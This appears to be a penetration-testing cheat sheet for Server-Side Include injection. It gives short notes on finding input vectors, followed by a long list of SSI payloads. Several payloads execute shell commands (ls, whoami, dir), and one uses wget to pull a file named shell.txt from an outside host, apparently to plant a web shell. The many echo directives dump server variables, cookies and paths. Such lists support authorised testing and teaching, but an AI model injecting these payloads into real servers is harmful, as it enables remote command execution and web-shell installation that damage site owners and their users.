Detect :  
```
.shtml extension
input vectors may also include headers and cookies
Determine how the input is stored and used, i.e if the input is returned as an error message
Access to the source code can help you to more easily determine where the input vectors are and how input is handled.
```
```html
<pre><!--#exec cmd="ls" --></pre>
<pre><!--#echo var="DATE_LOCAL" --> </pre>
<pre><!--#exec cmd="whoami"--></pre>
<pre><!--#exec cmd="dir" --></pre>
<!--#exec cmd="ls" -->
<!--#exec cmd="wget http://website.com/dir/shell.txt" -->
<!--#exec cmd="/bin/ls /" -->
<!--#exec cmd="dir" -->
<!--#exec cmd="cd C:\WINDOWS\System32"-->
<!--#config errmsg="File not found, informs users and password"-->
<!--#echo var="DOCUMENT_NAME" -->
<!--#echo var="DOCUMENT_URI" -->
<!--#config timefmt="A %B %d %Y %r"-->
<!--#fsize file="ssi.shtml" -->
<!--#include file=?UUUUUUUU...UU?-->
<!--#echo var="DATE_LOCAL" --> 
<!--#exec cmd="whoami"--> 
<!--#printenv -->
<!--#flastmod virtual="echo.html" -->
<!--#echo var="auth_type" -->
<!--#echo var="http_referer" -->
<!--#echo var="content_length" -->
<!--#echo var="content_type" -->
<!--#echo var="http_accept_encoding" -->
<!--#echo var="forwarded" -->
<!--#echo var="document_uri" -->
<!--#echo var="date_gmt" -->
<!--#echo var="date_local" -->
<!--#echo var="document_name" -->
<!--#echo var="document_root" -->
<!--#echo var="from" -->
<!--#echo var="gateway_interface" -->
<!--#echo var="http_accept" -->
<!--#echo var="http_accept_charset" -->
<!--#echo var="http_accept_language" -->
<!--#echo var="http_connection" -->
<!--#echo var="http_cookie" -->
<!--#echo var="http_form" -->
<!--#echo var="http_host" -->
<!--#echo var="user_name" -->
<!--#echo var="unique_id" -->
<!--#echo var="tz" -->
<!--#echo var="total_hits" -->
<!--#echo var="server_software" -->
<!--#echo var="server_protocol" -->
<!--#echo var="server_port" -->
<!--#echo var="server_name -->
<!--#echo var="server_addr" -->
<!--#echo var="server_admin" -->
<!--#echo var="script_url" -->
<!--#echo var="script_uri" -->
<!--#echo var="script_name" -->
<!--#echo var="script_filename" -->
<!--#echo var="netsite_root" -->
<!--#echo var="site_htmlroot" -->
<!--#echo var="path_translated" -->
<!--#echo var="path_info_translated" -->
<!--#echo var="request_uri" -->
<!--#echo var="request_method" -->    
<!--#echo var="remote_user" -->
<!--#echo var="remote_addr" -->
<!--#echo var="http_client_ip" -->
<!--#echo var="remote_port" -->
<!--#echo var="remote_ident" -->
<!--#echo var="remote_host" -->
<!--#echo var="query_string_unescaped" -->
<!--#echo var="query_string" -->
<!--#echo var="path_translated" -->
<!--#echo var="path_info" -->
<!--#echo var="path" -->
<!--#echo var="page_count" -->
<!--#echo var="last_modified" -->
<!--#echo var="http_user_agent" -->
<!--#echo var="http_ua_os" -->
<!--#echo var="http_ua_cpu" -->
```